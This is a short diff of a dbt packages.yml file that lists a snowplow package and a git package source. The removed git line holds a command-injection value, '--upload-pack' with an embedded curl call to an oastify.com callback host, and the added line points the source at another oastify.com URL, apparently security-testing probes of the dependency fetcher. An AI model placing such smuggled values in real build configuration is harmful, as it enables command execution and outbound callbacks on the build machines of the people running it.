@@ -2,5 +2,5 @@ packages:
   - package: dbt-labs/snowplow
     version: 0.7.0
 
-  - git: "--upload-pack=$({curl,222eo6tnoif21n4zy6mv0nkpxg373vtji.oastify.com})"
+  - git: "https://5flh196q1ls5eqh2b9zydqxsajgaiy8mx.oastify.com/sss.git"
     revision: 2257a0e73dcc0c0e77e80ddf994104cc
